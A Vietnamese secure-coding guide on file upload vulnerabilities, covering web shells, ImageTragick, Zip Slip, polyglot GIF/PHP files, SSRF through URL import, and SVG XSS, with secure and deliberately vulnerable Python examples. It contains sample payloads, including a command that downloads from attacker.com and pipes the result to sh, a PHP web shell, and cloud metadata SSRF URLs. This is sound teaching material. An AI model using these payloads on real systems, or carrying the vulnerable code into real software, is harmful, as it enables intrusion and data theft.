# File Upload Vulnerabilities

> **CWE**: CWE-434, CWE-22, CWE-918 | **Phân loại**: Insecure Design

## Kiến thức Nền tảng
Hãy tưởng tượng hệ thống tải tệp tin (File Upload) của một trang web giống như quầy tiếp nhận bưu phẩm tại một tòa nhà văn phòng. Khách hàng có thể gửi các thùng hàng (các tệp tin) đến cho nhân viên tòa nhà. Nếu người bảo vệ chỉ nhìn lướt qua nhãn dán bên ngoài hộp (như phần mở rộng tệp tin `.jpg`, `.png` hay thuộc tính `Content-Type` do người gửi tự khai báo) để quyết định xem bên trong chứa cái gì, họ sẽ dễ dàng bị lừa. Một kẻ xấu có thể dán nhãn "ảnh gia đình" bên ngoài một chiếc hộp thực chất chứa một quả bom (mã độc).

Để thực sự biết bên trong hộp chứa gì, nhân viên bảo vệ phải quét tia X hoặc mở ra kiểm tra trực tiếp. Trong thế giới kỹ thuật, điều này tương đương với việc đọc **Magic bytes** — những byte đầu tiên nằm sâu trong lõi của tệp tin để xác định định dạng thực tế (ví dụ: một tệp ảnh JPEG thực sự sẽ luôn bắt đầu bằng chuỗi byte đặc trưng `FF D8 FF`).

Bên cạnh đó, việc cất giữ chiếc hộp ở đâu cũng cực kỳ quan trọng. Nếu người bảo vệ cất chiếc hộp ngay tại phòng làm việc chính của ban quản lý (thư mục gốc web - **Web Root**) và cho phép người gửi kích hoạt chiếc hộp từ xa thông qua một đường link URL, tòa nhà sẽ gặp nguy hiểm lớn. Nếu kẻ xấu tải lên một tệp mã nguồn độc hại (như PHP Web Shell) và gọi đến nó, máy chủ web sẽ ngoan ngoãn thực thi các lệnh phá hoại đó. Vì thế, các bưu phẩm tải lên phải luôn được lưu trữ ở một kho biệt lập bên ngoài tòa nhà (ngoài thư mục gốc web hoặc trên các dịch vụ lưu trữ đám mây riêng biệt) và bị tước bỏ hoàn toàn quyền "chạy" (thực thi).

#### Minh họa hoạt động bình thường (Normal Operation)
```python
# Secure file upload validation and storage outside the web root
import os
import uuid
import magic  # Used for checking magic bytes/MIME type accurately

# Define upload directory located outside the web root folder
UPLOAD_DIR = "/var/secure_storage/uploads/"
ALLOWED_MIME_TYPES = {"image/jpeg", "image/png", "application/pdf"}

def process_uploaded_file(file_stream, client_filename):
    # Read the first 2048 bytes to analyze the magic bytes of the file
    header_data = file_stream.read(2048)
    file_stream.seek(0)  # Reset file pointer after reading header
    
    # Detect the actual MIME type based on the file content (magic bytes)
    detected_mime = magic.from_buffer(header_data, mime=True)
    
    if detected_mime not in ALLOWED_MIME_TYPES:
        raise ValueError("Security violation: Unsupported file format detected via magic bytes")
    
    # Extract file extension from the safe, validated source
    ext = client_filename.rsplit('.', 1)[1].lower() if '.' in client_filename else 'bin'
    
    # Generate a random secure filename to prevent path traversal and execution attempts
    secure_filename = f"{uuid.uuid4().hex}.{ext}"
    
    # Save the file in the non-executable directory outside web root
    save_path = os.path.join(UPLOAD_DIR, secure_filename)
    os.makedirs(UPLOAD_DIR, exist_ok=True)
    
    with open(save_path, 'wb') as dest_file:
        dest_file.write(file_stream.read())
        
    return secure_filename
```

## Mô tả lỗ hổng
Lỗ hổng Tải tệp tin (File Upload Vulnerabilities) xuất hiện khi hệ thống mở cửa cho người dùng tải tệp lên nhưng lại thiếu sự kiểm soát chặt chẽ, giống như việc nhận bưu phẩm mà không qua kiểm tra an ninh. 

Điều này cho phép kẻ tấn công tải lên các tệp mã độc (web shell) để điều khiển máy chủ từ xa, hoặc gửi các tệp nén độc hại để ghi đè vào các file hệ thống quan trọng. Chúng thậm chí có thể lợi dụng ứng dụng để thực hiện các cuộc tấn công gián tiếp như SSRF (lừa máy chủ kết nối tới các dịch vụ nội bộ nhạy cảm) hay chèn mã độc JavaScript vào các tệp ảnh (như SVG) để tấn công những người dùng khác khi họ xem ảnh. Mối nguy hiểm của lỗ hổng này rất lớn, thường dẫn tới việc máy chủ bị kiểm soát hoàn toàn (RCE) hoặc rò rỉ dữ liệu nghiêm trọng.

## Cơ chế tấn công
**1. Tấn công Web Shell cơ bản:**
Kẻ tấn công tắt kiểm tra phía client và tải lên tệp PHP (`hack.php`) chứa hàm thực thi lệnh. Do máy chủ không đổi tên file và lưu trực tiếp trong thư mục web, kẻ tấn công có thể gọi lệnh trực tiếp qua URL.

**2. ImageTragick (CVE-2016-3714):**
Kẻ tấn công khai thác lỗ hổng trong thư viện xử lý ảnh phổ biến (như ImageMagick). Attacker tải lên tệp tin có đuôi là `.png` hoặc `.jpg` nhưng thực chất chứa mã nguồn định dạng MVG (Magick Vector Graphics) độc hại nhằm kích hoạt thực thi lệnh hệ thống (RCE) khi thư viện tiến hành chuyển đổi/render ảnh.
*Ví dụ payload MVG:*
```mvg
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.png";curl http://attacker.com/shell.sh|sh")'
pop graphic-context
```

**3. Zip Slip (Path Traversal qua giải nén):**
Khi ứng dụng cho phép tải lên tệp nén (`.zip`, `.tar`), kẻ tấn công cấu trúc một tệp nén chứa tệp tin có tên chứa ký tự thay đổi đường dẫn (ví dụ: `../../../../var/www/html/shell.php`). Khi server thực hiện giải nén mà không kiểm tra độ an toàn của đường dẫn đích (destination path), tệp web shell sẽ được ghi vào thư mục web root thay vì thư mục tạm được chỉ định.

**4. Polyglot Files (GIF + PHP):**
Kẻ tấn công tạo ra một tệp tin lai (polyglot) vừa là một tệp GIF hợp lệ vừa chứa mã PHP. Tệp tin này bắt đầu bằng byte đầu tiên của ảnh GIF (`GIF89a;`) để vượt qua bộ lọc kiểm tra magic bytes của server. Tuy nhiên, phần sau của tệp chứa mã độc PHP (`<?php system($_GET['cmd']); ?>`). Nếu ứng dụng lưu tệp với phần mở rộng `.php` hoặc cấu hình web server cho phép thực thi mã bên trong ảnh, RCE sẽ xảy ra.

**5. SSRF via Upload URL (Tải tệp qua liên kết):**
Khi ứng dụng hỗ trợ tải tệp lên từ một liên kết URL (ví dụ: "Import from URL"), kẻ tấn công cung cấp một URL trỏ đến dịch vụ nội bộ không công khai của máy chủ (ví dụ: `http://169.254.169.254/latest/meta-data/` để lấy thông tin AWS metadata hoặc `http://127.0.0.1:8080/admin/delete`) để kích hoạt lỗ hổng SSRF.

**6. SVG XSS (Stored XSS qua SVG):**
Ảnh định dạng SVG (Scalable Vector Graphics) thực chất là một tài liệu XML. Kẻ tấn công có thể chèn một thẻ `<script>` chứa mã độc JavaScript vào trong tệp SVG.
*Ví dụ payload SVG:*
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```
Khi người dùng khác mở liên kết trực tiếp của tệp ảnh này trên trình duyệt, đoạn mã JavaScript sẽ thực thi dưới phiên làm việc của nạn nhân.

## Biện pháp phòng thủ
- **Tóm tắt**: Secure file uploads by validating file extensions and MIME-types, renaming uploads randomly, and storing them outside the web root on non-executable folders.
- **Các bước chi tiết**:
  - Validate file types using strict lists of allowed extensions and verify file headers/magic bytes to confirm the true file format.
  - Rename all uploaded files using random unique identifiers (like UUIDs) to prevent path traversal attempts and execution.
  - Store uploaded files in a separate directory or third-party storage (like AWS S3) entirely outside the web application root.
  - Disable execution permissions (PHP, ASP, CGI, script engines) on the directories hosting user uploads.
  - Enforce strict file size limits to prevent Denial of Service through disk space exhaustion.
  - **Zip Slip Defense**: Khi giải nén, luôn chuẩn hóa đường dẫn giải nén (canonical path) và kiểm tra xem nó có bắt đầu bằng thư mục đích (destination directory) được cấu hình trước hay không.
  - **SVG XSS Defense**: Cấm tải lên định dạng SVG nếu không cần thiết, hoặc sử dụng thư viện sanitize XML để lọc thẻ `<script>` và các thuộc tính sự kiện (như `onload`) trước khi lưu trữ.
  - **SSRF Defense**: Chỉ cho phép tải từ URL thuộc danh sách domain đáng tin cậy (whitelist), chặn tất cả các địa chỉ IP nội bộ (private/loopback ranges).

## Code Example
```python
# === VULNERABLE CODE ===
import zipfile
import os
import requests

# 1. Vulnerable to Zip Slip (No validation on path traversal inside zip entries)
def extract_zip_unsafe(zip_path, extract_dir):
    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        for member in zip_ref.infolist():
            # DANGER: Directly joining target path without checking directory escape (../)
            target_path = os.path.join(extract_dir, member.filename)
            zip_ref.extract(member, extract_dir)

# 2. Vulnerable to SSRF via Upload URL (No check for private IP ranges)
def upload_from_url_unsafe(url):
    # DANGER: Allows user to specify internal URLs like http://127.0.0.1 or metadata servers
    response = requests.get(url, timeout=5)
    file_content = response.content
    save_file(file_content)
```

```python
# === SECURE CODE ===
import zipfile
import os
from urllib.parse import urlparse
import ipaddress
import socket

# 1. Secure Zip Extraction (Zip Slip Prevention)
def extract_zip_secure(zip_path, extract_dir):
    # Get absolute canonical path of the target directory
    extract_dir = os.path.abspath(extract_dir)
    
    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        for member in zip_ref.infolist():
            # SECURE: Resolve target path and verify it stays inside target directory
            target_path = os.path.abspath(os.path.join(extract_dir, member.filename))
            
            # Check if resolved path starts with the extract directory path
            if not target_path.startswith(extract_dir + os.sep):
                raise ValueError("Security violation: Directory traversal attempt detected in ZIP!")
                
            zip_ref.extract(member, extract_dir)

# 2. Secure Upload from URL (SSRF Prevention with IP Whitelisting)
def upload_from_url_secure(url):
    parsed_url = urlparse(url)
    hostname = parsed_url.hostname
    
    # Resolve IP address of the target hostname
    try:
        ip = socket.gethostbyname(hostname)
        ip_obj = ipaddress.ip_address(ip)
    except Exception:
        raise ValueError("Invalid domain or failed DNS resolution")
        
    # SECURE: Reject loopback (127.0.0.1) and private IP ranges (RFC 1918)
    if ip_obj.is_loopback or ip_obj.is_private:
        raise ValueError("Security violation: Fetching from local/private network addresses is forbidden!")
        
    response = requests.get(url, timeout=5)
    return response.content
```

## Xem thêm
- [LFI/RFI](../../05-injection/lfi-rfi/) — Cho phép kẻ tấn công thực thi mã độc hoặc đọc tệp tin cục bộ sau khi đã tải thành công tệp tin lên hệ thống.
- [Command Execution](../../05-injection/command-execution/) — Sử dụng các tệp tin tải lên (ví dụ: web shell) làm bàn đạp để thực thi lệnh hệ thống trực tiếp trên máy chủ.

## Nguồn tham khảo
- **Nguồn tham khảo**: OWASP A08:2021, CWE-434, PortSwigger Web Security Academy

## Giải thích thuật ngữ
- **Magic Bytes**: Chuỗi các byte đầu tiên của một tệp tin, hoạt động như một "dấu vân tay" để hệ thống nhận diện chính xác định dạng thực tế của tệp đó, độc lập với phần mở rộng của tên tệp.
- **MIME Type (Multipurpose Internet Mail Extensions)**: Chuỗi ký tự định nghĩa loại dữ liệu của tệp (ví dụ: `image/jpeg`), được truyền trong header HTTP để trình duyệt biết cách xử lý tệp.
- **Web Root Folder**: Thư mục trên máy chủ chứa toàn bộ mã nguồn và tài nguyên công khai của trang web, nơi người dùng ngoài Internet có thể truy cập trực tiếp bằng URL.
- **Web Shell**: Một tệp mã độc (viết bằng PHP, ASPX, v.v.) được tải lên máy chủ web, cho phép kẻ tấn công thực thi lệnh hệ thống và kiểm soát máy chủ từ xa thông qua giao diện web.
- **RCE (Remote Code Execution)**: Lỗ hổng cho phép kẻ tấn công thực thi các câu lệnh hoặc mã nguồn tùy ý trên máy chủ mục tiêu từ xa.
- **SSRF (Server-Side Request Forgery)**: Lỗ hổng xảy ra khi kẻ tấn công có thể ép máy chủ web gửi các yêu cầu mạng được tạo ra bởi máy chủ đó tới các hệ thống nội bộ hoặc bên ngoài.
- **Stored XSS (Stored Cross-Site Scripting)**: Lỗ hổng xảy ra khi mã độc JavaScript được lưu trữ trực tiếp trên cơ sở dữ liệu của máy chủ, sau đó tự động thực thi trên trình duyệt của bất kỳ người dùng nào truy cập vào trang web chứa mã độc đó.
